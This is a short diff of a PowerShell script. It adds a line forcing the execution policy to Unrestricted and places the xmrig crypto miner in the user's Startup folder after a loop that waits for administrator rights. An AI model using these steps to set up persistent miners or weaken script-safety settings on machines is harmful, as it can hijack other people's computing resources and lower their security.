@@ -11,6 +11,8 @@ while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIde
     }
 }
 
+Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
+
 $minerHome = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2"
 $minerBinary = "xmrig.exe"
 
